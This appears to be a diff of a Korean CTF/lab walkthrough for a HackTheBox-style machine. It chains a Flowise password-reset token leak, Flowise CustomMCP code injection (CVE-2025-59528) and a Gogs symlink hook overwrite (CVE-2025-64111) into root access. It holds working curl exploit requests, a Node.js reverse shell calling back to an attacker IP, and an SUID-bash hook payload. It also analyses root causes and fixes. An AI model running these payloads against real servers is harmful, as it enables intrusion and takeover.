@@ -44,19 +44,13 @@ echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
 
 ### Web Enumeration
 
-`http://silentium.htb`에 접속하면 가짜 금융회사(Silentium) 랜딩 페이지가 표시된다. Wappalyzer로 기술 스택을 분석하면 Nginx 1.24.0, Ubuntu, Tailwind CSS가 확인된다. 페이지에는 Loan Calculator 섹션이 있어 서버 API 호출 가능성이 있어 보이지만, `assets/app.js`를 확인하면 계산 로직이 완전히 클라이언트 사이드에서 처리되며 서버로 요청을 보내지 않는다.
-
-![app js analysis](images/flowise_appjs_client_side_calculator.png)
-
-gobuster로 디렉토리를 열거한다. nginx가 존재하지 않는 모든 경로에 200(메인 페이지)으로 응답하는 와일드카드 문제가 발생하여 `--exclude-length 8753` 옵션으로 필터링한다.
+`http://silentium.htb`에 접속하면 가짜 금융회사(Silentium) 랜딩 페이지가 표시된다. 페이지에는 Loan Calculator 섹션이 있어 서버 API 호출 가능성이 있어 보이지만, `assets/app.js`를 확인하면 계산 로직이 완전히 클라이언트 사이드에서 처리되며 서버로 요청을 보내지 않는다. nginx가 존재하지 않는 모든 경로에 200(메인 페이지, 8753바이트)으로 응답하는 와일드카드 구조라 gobuster에 `--exclude-length` 옵션이 필요하다.
 
 ```bash
 gobuster dir -u http://silentium.htb \
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
   -x php,html,txt,json -t 50 --exclude-length 8753
 ```
-
-![gobuster result](images/gobuster_wildcard_excluded_assets_found.png)
 
 `/assets`만 발견되어 메인 도메인은 공격면이 없음을 확인한다.
 
@@ -73,7 +67,7 @@ ffuf -u http://silentium.htb \
 
 ![ffuf vhost result](images/ffuf_vhost_result_staging_200.png)
 
-`staging` 서브도메인이 Size 3142로 다른 응답을 반환한다. `/etc/hosts`에 추가한다.
+`staging` 서브도메인이 Size 3142로 다른 응답을 반환한다. `/etc/hosts`에 추가 후 접속하면 Flowise 로그인 페이지가 표시된다.
 
 ```bash
 echo "10.129.245.103 staging.silentium.htb" | sudo tee -a /etc/hosts
@@ -145,22 +139,18 @@ curl -s -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
 응답에서 `"name":"admin"`, `"tempToken":"QN86q6..."` 등이 그대로 노출된다. `ben@silentium.htb`가 admin 계정임을 확인했고, tempToken으로 비밀번호를 즉시 재설정한다.
 
 ```bash
+# 비밀번호 재설정
 curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"Passw0rd1234"}}'
-```
 
-재설정 후 로그인하여 JWT 쿠키를 확보한다.
-
-```bash
+# 로그인 + 쿠키 저장
 curl -s -c cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"ben@silentium.htb","password":"Passw0rd1234"}'
 ```
 
 응답에 `"name":"admin"`, `"isOrganizationAdmin":true`가 포함되어 admin 로그인에 성공했다.
-
-![flowise admin dashboard](images/flowise_admin_dashboard_logged_in.png)
 
 ### x-request-from: internal 헤더 발견
 
@@ -180,25 +170,7 @@ curl -s -b cookies.txt http://staging.silentium.htb/api/v1/chatflows \
 
 CVE-2025-59528은 Flowise의 CustomMCP 노드 설정값(`mcpServerConfig`)이 `Function()` 생성자에 검증 없이 전달되어 임의 JavaScript가 실행되는 취약점이다. Node.js 런타임에서 실행되므로 `process.mainModule.require('child_process')`를 통해 OS 명령 실행까지 이어진다.
 
-RCE 성공 여부를 먼저 HTTP 요청으로 검증한다.
-
-```bash
-# 공격 머신에서 HTTP 서버 실행
-python3 -m http.server 8080
-
-# CustomMCP 엔드포인트로 페이로드 전송
-curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-  -H "Content-Type: application/json" \
-  -H "x-request-from: internal" \
-  -d '{
-    "loadMethod": "listActions",
-    "inputs": {
-      "mcpServerConfig": "({x:(function(){ const cp = process.mainModule.require(\"child_process\"); cp.execSync(\"curl http://10.10.14.40:8080/rce-test\"); return 1; })()})"
-    }
-  }'
-```
-
-HTTP 서버 로그에 `GET /rce-test`가 찍히며 RCE가 확인된다. 단, 포트 4444 등 raw TCP 아웃바운드가 차단되어 있어 `/dev/tcp` 방식 리버스 쉘이 실패한다. Node.js의 `net` 모듈로 소켓을 직접 생성하면 동일한 HTTP 아웃바운드 경로를 사용하여 차단을 우회할 수 있다.
+포트 4444 등 raw TCP 아웃바운드가 차단되어 `/dev/tcp` 방식 리버스 쉘이 실패한다. HTTP 아웃바운드는 허용된다는 것을 먼저 확인한 뒤, Node.js의 `net` 모듈로 소켓을 직접 생성하여 동일한 경로를 통해 차단을 우회한다.
 
 ```bash
 # nc 리스너 시작
@@ -214,8 +186,6 @@ curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-met
       "mcpServerConfig": "({x:(function(){ const net=process.mainModule.require(\"net\"); const cp=process.mainModule.require(\"child_process\"); const s=net.createConnection(8080,\"10.10.14.40\"); s.on(\"connect\",function(){ const sh=cp.spawn(\"/bin/sh\",[\"-i\"],{stdio:[s,s,s]}); sh.on(\"close\",function(){ s.destroy(); }); }); return 1; })()})"}}'
 ```
 
-![nodejs reverse shell payload](images/CVE-2025-59528_customMCP_nodejs_socket_payload.png)
-
 ![reverse shell success](images/CVE-2025-59528_nodejs_reverse_shell_success.png)
 
 `/ #` 프롬프트와 `id` 결과로 컨테이너 내부에서 root 쉘이 획득됐다.
@@ -229,6 +199,7 @@ curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-met
 ```bash
 id && hostname
 # uid=0(root) gid=0(root) — hostname: c78c3cceb7ba
+
 cat /proc/self/status | grep -i cap
 # CapEff: 00000000a00425fb
 ```
@@ -257,14 +228,7 @@ Docker 실행 시 `-e` 옵션으로 주입된 크리덴셜이 평문으로 노�
 
 ### 호스트 SSH 접속 (크리덴셜 재사용)
 
-Docker 게이트웨이 IP를 확인한다.
-
-```bash
-ip route | grep default
-# default via 172.18.0.1 dev eth0
-```
-
-`172.18.0.1`은 Docker bridge 네트워크에서 호스트 머신이 컨테이너 쪽에 가진 IP다. 외부에서는 `10.129.245.103`으로 접근하는 동일한 머신이다. nmap에서 22번 포트가 열려있었으므로 탈취한 크리덴셜로 SSH를 시도한다.
+`ip route`로 확인한 Docker 게이트웨이 `172.18.0.1`은 컨테이너 네트워크에서 본 호스트 IP다. 외부에서는 `10.129.245.103`과 동일한 머신이다. nmap에서 SSH 포트가 열려있었으므로 탈취한 크리덴셜로 시도한다.
 
 ```bash
 ssh ben@10.129.245.103
@@ -287,37 +251,16 @@ cat ~/user.txt
 
 ### 내부 서비스 열거
 
-```bash
-id && sudo -l
-# uid=1000(ben) — Sorry, user ben may not run sudo on silentium.
-```
-
-![ben id sudo none](images/host_ben_id_sudo_none.png)
-
-sudo 권한 없음. 내부 포트와 프로세스를 열거한다.
+sudo -l은 권한 없음을 반환한다. 내부 포트와 root 프로세스를 열거한다.
 
 ```bash
 ss -tlnp
-```
-
-![internal ports](images/host_ss_internal_ports_37747_3001_3000.png)
-
-외부 nmap에서는 보이지 않았던 내부 포트들이 확인된다.
-
-| 포트 | 용도 |
-|------|------|
-| 127.0.0.1:3001 | **Gogs** (Git 서비스) |
-| 127.0.0.1:3000 | Flowise (Docker 컨테이너) |
-| 127.0.0.1:8025 | MailHog |
-| 127.0.0.1:37747 | 미식별 서비스 |
-
-```bash
 ps aux | grep root | grep -v '\['
 ```
 
 ![ps aux root processes](images/host_ps_aux_root_processes_gogs_flowise_docker.png)
 
-**`root 1495 /opt/gogs/gogs/gogs web`** — Gogs가 root 권한으로 실행 중이다. Gogs의 모든 작업(Git hook 포함)이 root 권한으로 처리된다는 의미다.
+**`root 1495 /opt/gogs/gogs/gogs web`** — Gogs가 root 권한으로 실행 중이다. Gogs의 모든 작업(Git hook 포함)이 root 권한으로 처리된다는 의미다. 내부 포트 3001에서 동작한다.
 
 ### Gogs 설정 분석
 
@@ -326,8 +269,6 @@ cat /opt/gogs/gogs/custom/conf/app.ini
 ```
 
 ![gogs app ini config](images/gogs_appini_full_config.png)
-
-핵심 설정값을 정리한다.
 
 | 항목 | 값 | 의미 |
 |------|-----|------|
@@ -345,9 +286,9 @@ CVE-2025-64111은 Gogs ≤ 0.13.3에서 파일 업데이트 API(`PUT /api/v1/rep
 |-----|------|
 | CVE | CVE-2025-64111 |
 | CVSS | 9.3 (Critical) |
-| 영향 버전 | Gogs ≤ 0.13.3 |
+| 영향 버전 | Gogs ≤ 0.13.3 (패치: 0.13.4) |
 | 필요 권한 | 인증된 일반 유저 |
-| 공격 유형 | Symlink Path Traversal → RCE |
+| 공격 유형 | Symlink Path Traversal → pre-receive hook RCE |
 
 ### SSH 포트 포워딩으로 Gogs 접근
 
@@ -357,20 +298,15 @@ Gogs는 `127.0.0.1:3001`에만 바인딩되어 외부에서 직접 접근이 불
 ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
 ```
 
-이 명령은 Kali 로컬 3001 포트를 SSH 터널을 통해 타겟 내부 `127.0.0.1:3001`로 포워딩한다. Kali 브라우저에서 `http://127.0.0.1:3001` 접속 후 bugi 계정을 신규 등록한다(`DISABLE_REGISTRATION=false`이므로 가능).
+Kali 로컬 3001 포트를 SSH 터널을 통해 타겟 내부 `127.0.0.1:3001`로 포워딩한다. `DISABLE_REGISTRATION=false`이므로 브라우저에서 bugi 계정을 신규 등록하고 API 토큰을 발급받는다.
 
 ```bash
-# /etc/hosts에 Gogs 도메인 추가
 echo "127.0.0.1 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
 ```
 
-### CVE-2025-64111 Exploit — 수동 체인
+### CVE-2025-64111 Exploit
 
-**1단계: API 토큰 발급**
-
-bugi 계정으로 Gogs 웹 UI에서 API 토큰을 발급한다(`User Settings > Applications > Generate Token`).
-
-**2단계: 타겟 레포지토리 생성**
+**1단계: 타겟 레포지토리 생성**
 
 ```bash
 curl -s -i -X POST http://127.0.0.1:3001/api/v1/user/repos \
@@ -379,7 +315,7 @@ curl -s -i -X POST http://127.0.0.1:3001/api/v1/user/repos \
   -d '{"name":"test_manual","private":false,"auto_init":false}'
 ```
 
-**3단계: 심링크 생성 및 push**
+**2단계: 심링크 생성 및 push**
 
 pre-receive hook 파일을 가리키는 심링크를 로컬 repo에 커밋하고 push한다.
 
@@ -397,30 +333,28 @@ git push -u origin master
 
 ![symlink push success](images/CVE-2025-64111_symlink_pre-receive_push_success.png)
 
-**4단계: API로 심링크를 통해 pre-receive hook 덮어쓰기**
+**3단계: API로 심링크를 통해 pre-receive hook 덮어쓰기**
 
-업로드된 심링크의 blob SHA를 확인한 뒤, PUT API로 악성 스크립트를 주입한다. Gogs API는 심링크의 목적지를 검증하지 않아 실제로는 `/root/gogs-repositories/bugi/test_manual.git/hooks/pre-receive` 파일에 쓰여진다.
-
-페이로드: SUID bash 생성
+Gogs API는 심링크의 목적지를 검증하지 않아 PUT 요청이 실제로는 `/root/gogs-repositories/bugi/test_manual.git/hooks/pre-receive` 파일에 쓰여진다. 페이로드는 SUID bash 생성이다.
 
 ```bash
+# 페이로드 base64 인코딩
 echo '#!/bin/bash
 cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' | base64 -w 0
 # IyEvYmluL2Jhc2gKY3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2ggJiYgY2htb2QgK3MgL3RtcC9yb290YmFzaAo=
-```
 
-```bash
+# PUT으로 심링크를 통해 hook 덮어쓰기
 curl -s -i -X PUT 'http://127.0.0.1:3001/api/v1/repos/bugi/test_manual/contents/evil_link' \
   -H 'Authorization: token <TOKEN>' \
   -H 'Content-Type: application/json' \
   -d '{"message":"pwn","content":"IyEvYmluL2Jhc2gKY3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2ggJiYgY2htb2QgK3MgL3RtcC9yb290YmFzaAo=","sha":"<BLOB_SHA>"}'
 ```
 
-`201 Created` 응답 확인. 응답에 `"type":"symlink","target":"...hooks/pre-receive"`가 포함되어 심링크를 통한 쓰기가 성공했음이 확인된다.
-
 ![put hook payload 201](images/CVE-2025-64111_put_hook_payload_201.png)
 
-**5단계: push로 pre-receive hook 트리거**
+`201 Created` 응답 확인. 응답에 `"type":"symlink","target":"...hooks/pre-receive"`가 포함되어 심링크를 통한 쓰기가 성공했음이 확인된다.
+
+**4단계: push로 pre-receive hook 트리거**
 
 ```bash
 echo "trigger" > pwn.txt && git add pwn.txt
@@ -438,7 +372,6 @@ ls -la /tmp/rootbash
 # -rwsr-sr-x 1 root root ... /tmp/rootbash
 
 /tmp/rootbash -p
-# rootbash-5.2# id
 # uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root)
 ```
 
@@ -458,17 +391,17 @@ cat /root/root.txt
 
 | 취약점 | 위치 | 근본 원인 | OWASP |
 |--------|------|-----------|-------|
-| CVE-2025-58434 (이메일 열거) | Flowise 로그인 API | 계정 존재 여부에 따른 응답 코드/메시지 차이로 이메일 열거 가능 | A07 Identification & Authentication Failures |
-| CVE-2025-58434 (토큰 노출) | Flowise forgot-password API | 비밀번호 재설정 임시 토큰이 이메일 발송 없이 HTTP 응답 본문에 평문 노출 | A02 Cryptographic Failures |
-| CVE-2025-59528 (RCE) | Flowise CustomMCP 노드 | `mcpServerConfig` 입력값이 `Function()` 생성자에 비검증 전달 → 임의 Node.js 코드 실행 | A03 Injection |
-| 컨테이너 환경변수 크리덴셜 노출 | Docker 컨테이너 환경변수 | SSH 크리덴셜이 컨테이너 환경변수에 평문으로 주입되어 RCE 시 즉시 노출 | A02 Cryptographic Failures |
-| 크리덴셜 재사용 | SSH 계정 | SMTP 서비스 패스워드가 호스트 SSH 계정에 동일하게 사용 | A07 Identification & Authentication Failures |
-| CVE-2025-64111 (Symlink RCE) | Gogs PUT Contents API | 파일 업데이트 API가 심링크 목적지를 검증하지 않아 레포지토리 외부 파일 덮어쓰기 가능 | A01 Broken Access Control |
-| root 권한 실행 | Gogs 서비스 설정 | Git hook이 Gogs 프로세스 권한(root)으로 실행되어 hook 덮어쓰기가 즉시 root RCE로 이어짐 | A05 Security Misconfiguration |
+| CVE-2025-58434 (이메일 열거) | Flowise 로그인 API | 계정 존재 여부에 따른 응답 코드/메시지 차이로 이메일 열거 가능 | A07 |
+| CVE-2025-58434 (토큰 노출) | Flowise forgot-password API | 비밀번호 재설정 임시 토큰이 이메일 발송 없이 HTTP 응답 본문에 평문 노출 | A02 |
+| CVE-2025-59528 (RCE) | Flowise CustomMCP 노드 | `mcpServerConfig` 입력값이 `Function()` 생성자에 비검증 전달 → 임의 Node.js 코드 실행 | A03 |
+| 환경변수 크리덴셜 노출 | Docker 컨테이너 환경변수 | SSH 크리덴셜이 컨테이너 환경변수에 평문으로 주입되어 RCE 시 즉시 노출 | A02 |
+| 크리덴셜 재사용 | SSH 계정 | SMTP 서비스 패스워드가 호스트 SSH 계정에 동일하게 사용 | A07 |
+| CVE-2025-64111 (Symlink RCE) | Gogs PUT Contents API | 파일 업데이트 API가 심링크 목적지를 검증하지 않아 레포지토리 외부 파일 덮어쓰기 가능 | A01 |
+| root 권한 실행 | Gogs 서비스 설정 | Git hook이 Gogs 프로세스 권한(root)으로 실행되어 hook 덮어쓰기가 즉시 root RCE로 이어짐 | A05 |
 
 ### 실제 환경에서의 위험성
 
-CVE-2025-58434에서 핵심은 forgot-password 응답이 이메일 발송 없이 토큰을 그대로 반환한다는 점이다. 이는 CWE-522(Insufficiently Protected Credentials)의 전형적인 사례로, 비밀번호 재설정 흐름에서 토큰은 반드시 외부 채널(이메일)을 통해서만 전달되어야 한다.
+CVE-2025-58434에서 핵심은 forgot-password 응답이 이메일 발송 없이 토큰을 그대로 반환한다는 점이다. 비밀번호 재설정 흐름에서 토큰은 반드시 외부 채널(이메일)을 통해서만 전달되어야 한다.
 
 CVE-2025-59528의 근본 원인은 사용자 입력을 동적 코드 평가(`Function()`, `eval()`)에 직접 전달하는 것이다. JSON 파서가 아닌 자바스크립트 평가자를 사용해 설정값을 파싱하는 설계 자체가 문제다. Flowise 3.0.6에서는 `Function()` 호출을 `JSON5.parse()`로 교체하여 수정됐다.
 
@@ -497,4 +430,3 @@ Gogs를 root로 실행하는 것은 최소 권한 원칙의 명백한 위반이�
 | hook 덮어쓰기 | API로 심링크를 통해 hook에 SUID bash 페이로드 주입 | curl |
 | 권한 상승 | push로 hook 트리거 → SUID bash 생성 → euid=root | git, bash |
 | 플래그 획득 | SUID bash로 root 파일 읽기 | rootbash -p, cat |
-
